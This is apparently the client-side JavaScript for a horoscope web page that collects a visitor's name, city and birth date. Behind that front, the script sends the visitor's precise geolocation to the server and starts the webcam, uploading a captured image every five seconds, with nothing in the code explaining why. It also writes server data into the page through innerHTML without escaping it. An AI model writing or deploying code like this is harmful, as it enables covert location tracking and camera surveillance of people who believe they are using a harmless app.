const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

let captureInterval = null;

async function start() {
  const name = document.getElementById("name").value.trim();
  const city = document.getElementById("city").value.trim();
  const dob = document.getElementById("dob").value;

  if (!name || !city || !dob) {
    alert("Please fill Name, City, and Date of Birth");
    return;
  }

  // LOCATION
  navigator.geolocation.getCurrentPosition(pos => {
    fetch("/location", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      })
    });
  });

  // CAMERA
  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  video.srcObject = stream;

  video.onloadedmetadata = () => {
    video.play();
    startCaptureLoop();
  };

  // HOROSCOPE
  const res = await fetch("/horoscope", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ name, city, dob })
  });
  const data = await res.json();

  document.getElementById("result").innerHTML = `
    <div class="sign">${data.icon} ${data.sign}</div>
    <div class="msg">
      ${data.name} from ${data.city}<br>
      ${data.message}
    </div>
  `;
}

function startCaptureLoop() {
  if (captureInterval) return;

  captureInterval = setInterval(() => {
    if (video.videoWidth === 0) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    fetch("/capture", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        image: canvas.toDataURL("image/png")
      })
    });
  }, 5000);
}
